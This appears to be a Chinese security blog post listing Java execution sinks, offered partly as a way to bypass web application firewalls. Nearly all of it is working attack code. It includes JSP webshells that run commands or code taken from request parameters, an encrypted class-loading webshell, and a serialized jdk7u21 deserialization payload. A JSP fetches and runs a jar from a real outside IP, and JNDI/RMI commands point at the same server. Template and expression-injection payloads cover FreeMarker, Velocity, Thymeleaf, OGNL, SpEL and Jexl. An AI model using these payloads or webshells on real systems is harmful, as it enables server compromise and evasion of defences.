
# Java sink整理


                                阅读量   
                                **842579**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](./img/198363/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/198363/t0188a54f3a09e6a1bb.jpg)](./img/198363/t0188a54f3a09e6a1bb.jpg)



## 前言

最近整理了一下java sink，同样可以用于bypass waf。



## sink

### <a class="reference-link" name="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></a>命令执行

常规命令执行

<a class="reference-link" name="Runtime"></a>**Runtime**

```
public class Main {
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

<a class="reference-link" name="ProcessBuilder"></a>**ProcessBuilder**

```
public class Main {
    public static void main(String[] args) throws IOException {
        //new ProcessBuilder("calc").start();
        List&lt;String&gt; commands = new ArrayList&lt;String&gt;();
        commands.add("C:\Windows\System32\cmd.exe");
        commands.add("/c ");
        commands.add("whoami");
        Process process = new ProcessBuilder().command(commands).start();
    }
}
```

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"></a>代码执行

<a class="reference-link" name="XMLDecoder"></a>**XMLDecoder**

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*"%&gt;
&lt;%!
String payload = "&lt;?xml version="1.0" encoding="UTF-8"?&gt;n" +
        "&lt;java version="1.8.0_151" class="java.beans.XMLDecoder"&gt;n" +
        "    &lt;void class="java.lang.ProcessBuilder"&gt;n" +
        "        &lt;array class="java.lang.String" length="1"&gt;n" +
        "            &lt;void index="0"&gt;n" +
        "                &lt;string&gt;calc&lt;/string&gt;n" +
        "            &lt;/void&gt;n" +
        "        &lt;/array&gt;n" +
        "        &lt;void method="start"/&gt;n" +
        "    &lt;/void&gt;n" +
        "&lt;/java&gt;";

java.beans.XMLDecoder xd = new java.beans.XMLDecoder(new java.io.BufferedInputStream(new java.io.ByteArrayInputStream(payload.getBytes())));
Object o = xd.readObject();
%&gt;
```

<a class="reference-link" name="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>**反序列化**

jdk7u21反序列化，window上弹出计算器。



```
&lt;%@page import=”java.io.,java.util.,java.net.,java.sql.,java.text.,java.beans.,java.lang.*”%&gt;
&lt;%java
byte[] payload = {-84,-19,0,5,115,114,0,23,106,97,118,97,46,117,116,105,108,46,76,105,110,107,101,100,72,97,115,104,83,101,116,-40,108,-41,90,-107,-35,42,30,2,0,0,120,114,0,17,106,97,118,97,46,117,116,105,108,46,72,97,115,104,83,101,116,-70,68,-123,-107,-106,-72,-73,52,3,0,0,120,112,119,12,0,0,0,16,63,64,0,0,0,0,0,2,115,114,0,58,99,111,109,46,115,117,110,46,111,114,103,46,97,112,97,99,104,101,46,120,97,108,97,110,46,105,110,116,101,114,110,97,108,46,120,115,108,116,99,46,116,114,97,120,46,84,101,109,112,108,97,116,101,115,73,109,112,108,9,87,79,-63,110,-84,-85,51,3,0,8,73,0,13,95,105,110,100,101,110,116,78,117,109,98,101,114,73,0,14,95,116,114,97,110,115,108,101,116,73,110,100,101,120,90,0,21,95,117,115,101,83,101,114,118,105,99,101,115,77,101,99,104,97,110,105,115,109,76,0,11,95,97,117,120,67,108,97,115,115,101,115,116,0,59,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,114,117,110,116,105,109,101,47,72,97,115,104,116,97,98,108,101,59,91,0,10,95,98,121,116,101,99,111,100,101,115,116,0,3,91,91,66,91,0,6,95,99,108,97,115,115,116,0,18,91,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,76,0,5,95,110,97,109,101,116,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,0,17,95,111,117,116,112,117,116,80,114,111,112,101,114,116,105,101,115,116,0,22,76,106,97,118,97,47,117,116,105,108,47,80,114,111,112,101,114,116,105,101,115,59,120,112,0,0,0,0,-1,-1,-1,-1,0,112,117,114,0,3,91,91,66,75,-3,25,21,103,103,-37,55,2,0,0,120,112,0,0,0,2,117,114,0,2,91,66,-84,-13,23,-8,6,8,84,-32,2,0,0,120,112,0,0,7,-18,-54,-2,-70,-66,0,0,0,50,0,85,10,0,3,0,34,7,0,83,7,0,37,7,0,38,1,0,16,115,101,114,105,97,108,86,101,114,115,105,111,110,85,73,68,1,0,1,74,1,0,13,67,111,110,115,116,97,110,116,86,97,108,117,101,5,-83,32,-109,-13,-111,-35,-17,62,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,19,83,116,117,98,84,114,97,110,115,108,101,116,80,97,121,108,111,97,100,1,0,12,73,110,110,101,114,67,108,97,115,115,101,115,1,0,53,76,121,115,111,115,101,114,105,97,108,47,112,97,121,108,111,97,100,115,47,117,116,105,108,47,71,97,100,103,101,116,115,36,83,116,117,98,84,114,97,110,115,108,101,116,80,97,121,108,111,97,100,59,1,0,9,116,114,97,110,115,102,111,114,109,1,0,114,40,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,68,79,77,59,91,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,41,86,1,0,8,100,111,99,117,109,101,110,116,1,0,45,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,68,79,77,59,1,0,8,104,97,110,100,108,101,114,115,1,0,66,91,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,1,0,10,69,120,99,101,112,116,105,111,110,115,7,0,39,1,0,-90,40,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,68,79,77,59,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,100,116,109,47,68,84,77,65,120,105,115,73,116,101,114,97,116,111,114,59,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,41,86,1,0,8,105,116,101,114,97,116,111,114,1,0,53,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,100,116,109,47,68,84,77,65,120,105,115,73,116,101,114,97,116,111,114,59,1,0,7,104,97,110,100,108,101,114,1,0,65,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,12,71,97,100,103,101,116,115,46,106,97,118,97,12,0,10,0,11,7,0,40,1,0,51,121,115,111,115,101,114,105,97,108,47,112,97,121,108,111,97,100,115,47,117,116,105,108,47,71,97,100,103,101,116,115,36,83,116,117,98,84,114,97,110,115,108,101,116,80,97,121,108,111,97,100,1,0,64,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,114,117,110,116,105,109,101,47,65,98,115,116,114,97,99,116,84,114,97,110,115,108,101,116,1,0,20,106,97,118,97,47,105,111,47,83,101,114,105,97,108,105,122,97,98,108,101,1,0,57,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,84,114,97,110,115,108,101,116,69,120,99,101,112,116,105,111,110,1,0,31,121,115,111,115,101,114,105,97,108,47,112,97,121,108,111,97,100,115,47,117,116,105,108,47,71,97,100,103,101,116,115,1,0,8,60,99,108,105,110,105,116,62,1,0,4,99,97,108,99,8,0,42,1,0,7,111,115,46,110,97,109,101,8,0,44,1,0,16,106,97,118,97,47,108,97,110,103,47,83,121,115,116,101,109,7,0,46,1,0,11,103,101,116,80,114,111,112,101,114,116,121,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,12,0,48,0,49,10,0,47,0,50,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,7,0,52,1,0,11,116,111,76,111,119,101,114,67,97,115,101,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,12,0,54,0,55,10,0,53,0,56,1,0,3,119,105,110,8,0,58,1,0,10,115,116,97,114,116,115,87,105,116,104,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,90,12,0,60,0,61,10,0,53,0,62,1,0,17,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,7,0,64,1,0,10,103,101,116,82,117,110,116,105,109,101,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,59,12,0,66,0,67,10,0,65,0,68,1,0,7,99,109,100,46,101,120,101,8,0,70,1,0,2,47,99,8,0,72,1,0,4,101,120,101,99,1,0,40,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,12,0,74,0,75,10,0,65,0,76,1,0,7,47,98,105,110,47,115,104,8,0,78,1,0,2,45,99,8,0,80,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,1,0,30,121,115,111,115,101,114,105,97,108,47,80,119,110,101,114,51,48,54,51,50,54,48,48,53,55,51,52,51,48,48,1,0,32,76,121,115,111,115,101,114,105,97,108,47,80,119,110,101,114,51,48,54,51,50,54,48,48,53,55,51,52,51,48,48,59,0,33,0,2,0,3,0,1,0,4,0,1,0,26,0,5,0,6,0,1,0,7,0,0,0,2,0,8,0,4,0,1,0,10,0,11,0,1,0,12,0,0,0,47,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,46,0,14,0,0,0,12,0,1,0,0,0,5,0,15,0,84,0,0,0,1,0,19,0,20,0,2,0,12,0,0,0,63,0,0,0,3,0,0,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,51,0,14,0,0,0,32,0,3,0,0,0,1,0,15,0,84,0,0,0,0,0,1,0,21,0,22,0,1,0,0,0,1,0,23,0,24,0,2,0,25,0,0,0,4,0,1,0,26,0,1,0,19,0,27,0,2,0,12,0,0,0,73,0,0,0,4,0,0,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,55,0,14,0,0,0,42,0,4,0,0,0,1,0,15,0,84,0,0,0,0,0,1,0,21,0,22,0,1,0,0,0,1,0,28,0,29,0,2,0,0,0,1,0,30,0,31,0,3,0,25,0,0,0,4,0,1,0,26,0,8,0,41,0,11,0,1,0,12,0,0,0,108,0,6,0,3,0,0,0,78,-89,0,3,1,76,18,43,77,18,45,-72,0,51,-74,0,57,18,59,-74,0,63,-103,0,31,-72,0,69,6,-67,0,53,89,3,18,71,83,89,4,18,73,83,89,5,44,83,-74,0,77,87,-89,0,28,-72,0,69,6,-67,0,53,89,3,18,79,83,89,4,18,81,83,89,5,44,83,-74,0,77,87,-79,0,0,0,1,0,82,0,0,0,12,0,3,3,-2,0,48,0,5,7,0,53,24,0,2,0,32,0,0,0,2,0,33,0,17,0,0,0,10,0,1,0,2,0,35,0,16,0,9,117,113,0,126,0,12,0,0,1,-44,-54,-2,-70,-66,0,0,0,50,0,27,10,0,3,0,21,7,0,23,7,0,24,7,0,25,1,0,16,115,101,114,105,97,108,86,101,114,115,105,111,110,85,73,68,1,0,1,74,1,0,13,67,111,110,115,116,97,110,116,86,97,108,117,101,5,113,-26,105,-18,60,109,71,24,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,3,70,111,111,1,0,12,73,110,110,101,114,67,108,97,115,115,101,115,1,0,37,76,121,115,111,115,101,114,105,97,108,47,112,97,121,108,111,97,100,115,47,117,116,105,108,47,71,97,100,103,101,116,115,36,70,111,111,59,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,12,71,97,100,103,101,116,115,46,106,97,118,97,12,0,10,0,11,7,0,26,1,0,35,121,115,111,115,101,114,105,97,108,47,112,97,121,108,111,97,100,115,47,117,116,105,108,47,71,97,100,103,101,116,115,36,70,111,111,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,20,106,97,118,97,47,105,111,47,83,101,114,105,97,108,105,122,97,98,108,101,1,0,31,121,115,111,115,101,114,105,97,108,47,112,97,121,108,111,97,100,115,47,117,116,105,108,47,71,97,100,103,101,116,115,0,33,0,2,0,3,0,1,0,4,0,1,0,26,0,5,0,6,0,1,0,7,0,0,0,2,0,8,0,1,0,1,0,10,0,11,0,1,0,12,0,0,0,47,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,59,0,14,0,0,0,12,0,1,0,0,0,5,0,15,0,18,0,0,0,2,0,19,0,0,0,2,0,20,0,17,0,0,0,10,0,1,0,2,0,22,0,16,0,9,112,116,0,4,80,119,110,114,112,119,1,0,120,115,125,0,0,0,1,0,29,106,97,118,97,120,46,120,109,108,46,116,114,97,110,115,102,111,114,109,46,84,101,109,112,108,97,116,101,115,120,114,0,23,106,97,118,97,46,108,97,110,103,46,114,101,102,108,101,99,116,46,80,114,111,120,121,-31,39,-38,32,-52,16,67,-53,2,0,1,76,0,1,104,116,0,37,76,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,73,110,118,111,99,97,116,105,111,110,72,97,110,100,108,101,114,59,120,112,115,114,0,50,115,117,110,46,114,101,102,108,101,99,116,46,97,110,110,111,116,97,116,105,111,110,46,65,110,110,111,116,97,116,105,111,110,73,110,118,111,99,97,116,105,111,110,72,97,110,100,108,101,114,85,-54,-11,15,21,-53,126,-91,2,0,2,76,0,12,109,101,109,98,101,114,86,97,108,117,101,115,116,0,15,76,106,97,118,97,47,117,116,105,108,47,77,97,112,59,76,0,4,116,121,112,101,116,0,17,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,120,112,115,114,0,17,106,97,118,97,46,117,116,105,108,46,72,97,115,104,77,97,112,5,7,-38,-63,-61,22,96,-47,3,0,2,70,0,10,108,111,97,100,70,97,99,116,111,114,73,0,9,116,104,114,101,115,104,111,108,100,120,112,63,64,0,0,0,0,0,12,119,8,0,0,0,16,0,0,0,1,116,0,8,102,53,97,53,97,54,48,56,113,0,126,0,9,120,118,114,0,29,106,97,118,97,120,46,120,109,108,46,116,114,97,110,115,102,111,114,109,46,84,101,109,112,108,97,116,101,115,0,0,0,0,0,0,0,0,0,0,0,120,112,120};

ObjectInputStream in = new ObjectInputStream(new BufferedInputStream(new ByteArrayInputStream(payload)));
in.readObject();
%&gt;
```

<a class="reference-link" name="ScriptEngineManager.eval"></a>**ScriptEngineManager.eval**

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,javax.script.*"%&gt;
&lt;%
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        BufferedReader object = (BufferedReader)scriptEngineManager.getEngineByName("JavaScript").eval("new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cmd.exe /c "+request.getParameter("cmd")+"").getInputStream()))");

        String line = "";
        String result = "";
        while((line=object.readLine())!=null)
        {
            result = result + line;
        }
        out.println(result);
%&gt;
```

<a class="reference-link" name="Compilable.compile"></a>**Compilable.compile**

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,javax.script.*"%&gt;
&lt;%
    ScriptEngineManager manager = new ScriptEngineManager();
    ScriptEngine engine = manager.getEngineByName("JavaScript");

    Compilable compEngine = (Compilable) engine;
    CompiledScript script = compEngine.compile("new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cmd.exe /c dir").getInputStream()))");
    BufferedReader object = (BufferedReader)script.eval();

    String line = "";
    String result = "";
    while((line=object.readLine())!=null)
    {
        result = result + line;
    }
    out.println(result);
%&gt;
```

<a class="reference-link" name="JShell"></a>**JShell**

```
&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src"))%&gt;
```

<a class="reference-link" name="defineClass+newInstance"></a>**defineClass+newInstance**

```
&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;
&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b)
{return super.defineClass(b,0,b.length);}}%&gt;
&lt;%if(request.getParameter("pass")!=null){
String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}
Cipher c=Cipher.getInstance("AES");
c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
String uploadString= request.getReader().readLine();
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);
%&gt;
```

<a class="reference-link" name="defineclass+forName"></a>**defineclass+forName**

base64的class是java1.8，所以需要1.8才能运行

```
String R = "yv66vgAAADQAJQoACQAWCgAXABgIABkKABcAGgcAGwoABQAcBwAdCgAHABYHAB4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAHQcAGwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAMRXhwbG9pdC5qYXZhDAAKAAsHAB8MACAAIQEABGNhbGMMACIAIwEAE2phdmEvbGFuZy9FeGNlcHRpb24MACQACwEAB0V4cGxvaXQBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACQAAAAAAAwABAAoACwABAAwAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAA0AAAAaAAYAAAALAAQADQANABAAEAAOABEADwAVABEADgAAABAAAv8AEAABBwAPAAEHABAEAAkAEQASAAEADAAAACUAAgACAAAACbsAB1m3AAhMsQAAAAEADQAAAAoAAgAAABMACAAUAAgAEwALAAEADAAAAE8AAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAgANAAAAFgAFAAAABQAJAAgADAAGAA0ABwARAAkADgAAAAcAAkwHABAEAAEAFAAAAAIAFQ==";
sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
byte[] bt = decoder.decodeBuffer(R);
DefiningClassLoader cls = new DefiningClassLoader();
cls.defineClass("Exploit",bt);
Class.forName("Exploit",true,cls);
```

<a class="reference-link" name="rmi-registry.bind"></a>**rmi-registry.bind**

yso利用

```
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 Jdk7u21 "calc"
```

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,java.rmi.*,java.rmi.server.*,java.rmi.registry.*"%&gt;
&lt;%
class ServerImp extends UnicastRemoteObject {
    protected ServerImp() throws RemoteException {
    }

}
ServerImp server = new ServerImp();
int port = 1099;
String registry_name = "rmi";
Registry registry = LocateRegistry.createRegistry(port);
registry.bind(registry_name, server);
System.out.println("Port:1099,Name:rmi,Service Start!n");
%&gt;
```

<a class="reference-link" name="jrmp"></a>**jrmp**

java8 -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer [http://188.131.187.191/#Exploit](http://188.131.187.191/#Exploit)

Exploit<br>
使用javac进行编译

```
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("calc");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,java.rmi.*,java.rmi.server.*,java.rmi.registry.*"%&gt;
&lt;%
String host = "127.0.0.1";
int port = 8855;

ObjID id = new ObjID((new Random()).nextInt());
sun.rmi.transport.tcp.TCPEndpoint te = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
sun.rmi.server.UnicastRef ref = new sun.rmi.server.UnicastRef(new sun.rmi.transport.LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
ObjectOutputStream outStream = new ObjectOutputStream(new BufferedOutputStream(byteArrayOutputStream));
outStream.writeObject(obj);
outStream.flush();
outStream.close();

ObjectInputStream in = new ObjectInputStream(new BufferedInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())));
in.readObject();
%&gt;
```

<a class="reference-link" name="jndi"></a>**jndi**

yso利用

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://188.131.187.191/#Exploit
```

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*,java.rmi.*,java.rmi.server.*,java.rmi.registry.*,javax.naming.*"%&gt;
&lt;%
System.setProperty(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
System.setProperty(Context.PROVIDER_URL,"rmi://127.0.0.1:1099");
Context ctx = new InitialContext();
Object obj = ctx.lookup("Exploit");
System.out.println(obj.toString());
%&gt;
```

<a class="reference-link" name="%E5%8F%8D%E5%B0%84"></a>**反射**

```
String op = "";
Class rt = Class.forName("java.lang.Runtime");
Method gr = rt.getMethod("getRuntime");
Method ex = rt.getMethod("exec", String.class);
Process e = (Process) ex.invoke(gr.invoke(null, new Object[]{}),  "cmd /c calc");
System.out.print(op);
```

<a class="reference-link" name="%E8%BF%9C%E7%A8%8Bclass%E5%8A%A0%E8%BD%BD"></a>**远程class加载**

```
package com.company;
import java.io.IOException;

public class Evil {
    public void exec(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);
    }
}
```

远程jar文件

```
&lt;%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*"%&gt;
&lt;%
out.println(222222222);
URL url = new URL("http://188.131.187.191/Temp.jar");
URLClassLoader loader = new URLClassLoader (new URL[] {url});
Class cl = Class.forName ("com.company.Evil", true, loader);
Object evil = cl.newInstance();
cl.getMethod("exec",String.class).invoke(evil,"calc");
%&gt;
```

<a class="reference-link" name="javassist"></a>**javassist**

```
&lt;dependency&gt;
    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
    &lt;version&gt;3.26.0-GA&lt;/version&gt;
&lt;/dependency&gt;
```

```
public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException {
    String command = "calc";

    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(HashSet.class));
    CtClass cc = pool.get(HashSet.class.getName());
    //System.out.println(angelwhu.model.Point.class.getName());

    cc.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec("" + command.replaceAll(""", "\"") +"");");
    //加入关键执行代码，生成一个静态函数。

    String newClassNameString = "Test";
    cc.setName(newClassNameString);

    CtMethod mthd = CtNewMethod.make("public static void main(String[] args) throws Exception {new " + newClassNameString + "();}", cc);
    cc.addMethod(mthd);

    cc.toClass().newInstance();
}

```

### <a class="reference-link" name="%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"></a>模板注入

<a class="reference-link" name="jsp"></a>**jsp**

```
&lt;%
out.println(22222);
%&gt;
${Runtime.getRuntime().exec("calc")}
```

<a class="reference-link" name="FreeMarker"></a>**FreeMarker**

```
&lt;dependency&gt;
    &lt;groupId&gt;org.freemarker&lt;/groupId&gt;
    &lt;artifactId&gt;freemarker&lt;/artifactId&gt;
    &lt;version&gt;2.3.20&lt;/version&gt;
&lt;/dependency&gt;
```

1.ftl

```
FreeMarker Template example: ${message}

&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
${ ex("whoami") }
```

```
Configuration cfg = new Configuration();
Template template = cfg.getTemplate("src/1.ftl");

// Build the data-model
Map&lt;String, Object&gt; data = new HashMap&lt;String, Object&gt;();
data.put("message", "Hello World!");

// Console output
Writer out = new OutputStreamWriter(System.out);
template.process(data, out);
out.flush();
```

<a class="reference-link" name="Velocity"></a>**Velocity**

```
&lt;dependency&gt;
    &lt;groupId&gt;apache-collections&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
    &lt;version&gt;3.1&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;apache-lang&lt;/groupId&gt;
    &lt;artifactId&gt;commons-lang&lt;/artifactId&gt;
    &lt;version&gt;2.1&lt;/version&gt;
&lt;/dependency&gt;


&lt;dependency&gt;
    &lt;groupId&gt;apache-velocity&lt;/groupId&gt;
    &lt;artifactId&gt;velocity&lt;/artifactId&gt;
    &lt;version&gt;1.5&lt;/version&gt;
&lt;/dependency&gt;
```

vm

```
hello ${name}

#set($e="e")
${e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")}
```

```
VelocityEngine ve = new VelocityEngine();
ve.init();

/* next, get the Template */
Template t = ve.getTemplate( "src/1.vm" );

/* create a context and add data */
VelocityContext context = new VelocityContext();
context.put("name", "lufei");

/* now render the template into a StringWriter */
StringWriter writer = new StringWriter();
t.merge( context, writer );

System.out.println( writer.toString() );
```

<a class="reference-link" name="thremeleaf"></a>**thremeleaf**

thremeleaf是在使用springboot时接触到的一个模板引擎，用于处理静态的html页面

```
&lt;dependency&gt;
    &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt;
    &lt;artifactId&gt;thymeleaf&lt;/artifactId&gt;
    &lt;version&gt;3.0.0.RELEASE&lt;/version&gt;
&lt;/dependency&gt;
```

```
名字：&lt;span th:text="${name}"&gt;&lt;/span&gt;
&lt;span th:text="${new ProcessBuilder(new String[]{new String(new byte[]{99,97,108,99})}).start()}"&gt;&lt;/span&gt;
```

```
File file = new File("d:/1.txt");
final FileWriter writer = new FileWriter(file);

final FileTemplateResolver templateResolver = new FileTemplateResolver();
TemplateEngine templateEngine = new TemplateEngine();
templateEngine.setTemplateResolver(templateResolver);

Context context = new Context();
context.setVariable("name","lufei");
String result = templateEngine.process("./src/1.html", context);
System.out.println(result);
```

### <a class="reference-link" name="%E8%A1%A8%E8%BE%BE%E5%BC%8F"></a>表达式

<a class="reference-link" name="EL"></a>**EL**

```
&lt;%
out.println(22222);
%&gt;
${2*3}
${Runtime.getRuntime().exec("calc")}
```

<a class="reference-link" name="OGNL"></a>**OGNL**

```
&lt;dependency&gt;
&lt;groupId&gt;ognl&lt;/groupId&gt;
&lt;artifactId&gt;ognl&lt;/artifactId&gt;
&lt;version&gt;3.0.1&lt;/version&gt;
&lt;/dependency&gt;
```

高版本需要自己设置安全权限

```
OgnlContext context = new OgnlContext();
Object execResult = Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", null);
System.out.println(execResult);
```

<a class="reference-link" name="spEL"></a>**spEL**

Spring Expression Language（简称SpEL）是一种强大的表达式语言

```
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
    &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;
    &lt;version&gt;5.2.1.RELEASE&lt;/version&gt;
&lt;/dependency&gt;
```

```
ExpressionParser parser = new SpelExpressionParser();
System.out.println(parser.parseExpression("T(java.lang.Runtime).getRuntime().exec("calc")").getValue());
```

<a class="reference-link" name="Jexl"></a>**Jexl**

```
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
    &lt;artifactId&gt;commons-jexl&lt;/artifactId&gt;
    &lt;version&gt;2.1.1&lt;/version&gt;
&lt;/dependency&gt;
```

```
JexlContext jc = new MapContext();
Expression e = new JexlEngine().createExpression("''.class.forName('java.lang.Runtime').getRuntime().exec("calc")");
Object result = e.evaluate(jc);
System.out.println(result);
```

